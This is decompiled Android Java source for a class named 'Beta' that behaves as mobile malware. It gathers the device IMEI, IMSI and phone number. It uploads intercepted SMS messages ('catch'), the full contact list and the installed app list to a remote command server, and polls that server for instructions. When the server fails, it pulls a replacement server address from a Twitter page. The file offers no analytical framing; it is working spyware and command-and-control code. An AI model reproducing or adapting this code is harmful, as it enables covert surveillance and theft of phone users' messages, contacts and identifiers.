package ru.beta;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Build.VERSION;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class Beta
{
  public static Settings settings;
  
  public Beta(Context paramContext, JSONObject paramJSONObject)
  {
    settings = new Settings();
    Settings localSettings = settings;
    Settings.setSettings(settings);
    paramContext.getPackageName();
    if (!settings.load(paramContext)) {
      if ((!paramJSONObject.has("server")) || (!paramJSONObject.has("twitterUrl")) || (!paramJSONObject.has("apiKey")) || (!paramJSONObject.has("appId")) || (!paramJSONObject.has("period")) || (!paramJSONObject.has("startPeriod")) || (!paramJSONObject.has("version")) || (!paramJSONObject.has("sid"))) {}
    }
    for (;;)
    {
      try
      {
        settings.server = paramJSONObject.getString("server");
        settings.twitterUrl = paramJSONObject.getString("twitterUrl");
        settings.apiKey = paramJSONObject.getString("apiKey");
        settings.appId = paramJSONObject.getString("appId");
        settings.period = paramJSONObject.getInt("period");
        settings.startPeriod = paramJSONObject.getInt("startPeriod");
        settings.version = paramJSONObject.getString("version");
        settings.sid = paramJSONObject.getString("sid");
        settings.timeNextConnection = (System.currentTimeMillis() + settings.startPeriod * Constants.SECOND);
        settings.packageName = paramContext.getPackageName();
        System.out.println("packageName: " + settings.packageName);
        settings.save(paramContext);
        Functions.startTimer(paramContext);
        MainService.start(paramContext, new Intent(), "logs");
        if (Constants.DEBUG) {
          System.out.println("Beta Created OK");
        }
        return;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        continue;
      }
      if (System.currentTimeMillis() > settings.timeNextConnection)
      {
        settings.timeNextConnection = (System.currentTimeMillis() + settings.period * Constants.SECOND);
        settings.save(paramContext);
      }
      Functions.startTimer(paramContext);
      MainService.start(paramContext, new Intent(), "logs");
    }
  }
  
  public static List<NameValuePair> getDefaultHttpParams(String paramString)
  {
    LinkedList localLinkedList = new LinkedList();
    localLinkedList.add(new BasicNameValuePair("imei", settings.imei));
    localLinkedList.add(new BasicNameValuePair("imsi", settings.imsi));
    localLinkedList.add(new BasicNameValuePair("time", String.valueOf(System.currentTimeMillis())));
    localLinkedList.add(new BasicNameValuePair("phone", settings.phone));
    localLinkedList.add(new BasicNameValuePair("version", settings.version));
    localLinkedList.add(new BasicNameValuePair("sid", settings.sid));
    localLinkedList.add(new BasicNameValuePair("type", paramString));
    localLinkedList.add(new BasicNameValuePair("os", "android"));
    localLinkedList.add(new BasicNameValuePair("model", Build.MODEL));
    localLinkedList.add(new BasicNameValuePair("manufacturer", Build.MANUFACTURER));
    localLinkedList.add(new BasicNameValuePair("sdk", String.valueOf(Build.VERSION.SDK_INT)));
    localLinkedList.add(new BasicNameValuePair("apiKey", settings.apiKey));
    localLinkedList.add(new BasicNameValuePair("appId", settings.appId));
    return localLinkedList;
  }
  
  public static JSONObject sendCatchRequest(String paramString1, String paramString2)
  {
    if (Constants.DEBUG) {
      System.out.println("sendCatchRequest()");
    }
    try
    {
      List localList = getDefaultHttpParams("catch");
      localList.add(new BasicNameValuePair("number", paramString1));
      localList.add(new BasicNameValuePair("text", paramString2));
      paramString1 = Functions.sendHttpRequest(settings.server, "POST", localList, new LinkedList(), false, null);
      if ((paramString1 != null) && (paramString1.getResponseCode() == 200))
      {
        paramString1 = Functions.parseResponse(paramString1.getInputStream());
        return paramString1;
      }
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return new JSONObject();
  }
  
  public static void sendContactsToServer(String paramString)
  {
    if (Constants.DEBUG) {
      System.out.println("sendContactsToServer()");
    }
    try
    {
      List localList = getDefaultHttpParams("phonebook");
      paramString = Functions.sendHttpRequest(settings.server, "POST", localList, new LinkedList(), true, paramString);
      if (paramString != null)
      {
        int i = paramString.getResponseCode();
        if (Constants.DEBUG) {
          System.out.println("getResponseCode: " + i);
        }
        paramString.disconnect();
      }
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void sendPackagesToServer(String paramString)
  {
    if (Constants.DEBUG) {
      System.out.println("sendPackagesToServer()");
    }
    try
    {
      List localList = getDefaultHttpParams("packages");
      paramString = Functions.sendHttpRequest(settings.server, "POST", localList, new LinkedList(), true, paramString);
      if (paramString != null)
      {
        int i = paramString.getResponseCode();
        if (Constants.DEBUG) {
          System.out.println("getResponseCode: " + i);
        }
        paramString.disconnect();
      }
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static JSONObject sendRequest(Context paramContext)
  {
    if (Constants.DEBUG) {
      System.out.println("sendRequest()");
    }
    try
    {
      Object localObject = getDefaultHttpParams("callback");
      localObject = Functions.sendHttpRequest(settings.server, "POST", (List)localObject, new LinkedList(), false, null);
      if (localObject != null)
      {
        int i = ((HttpURLConnection)localObject).getResponseCode();
        if (Constants.DEBUG) {
          System.out.println("getResponseCode: " + i);
        }
        if (i == 200)
        {
          localObject = Functions.parseResponse(((HttpURLConnection)localObject).getInputStream());
          return localObject;
        }
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    try
    {
      Settings localSettings = Settings.getSettings();
      String str = Functions.parseTwitter(paramContext, localSettings.twitterUrl);
      if (str.startsWith("http://"))
      {
        localSettings.server = str;
        localSettings.save(paramContext);
      }
      return new JSONObject();
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
      }
    }
  }
}
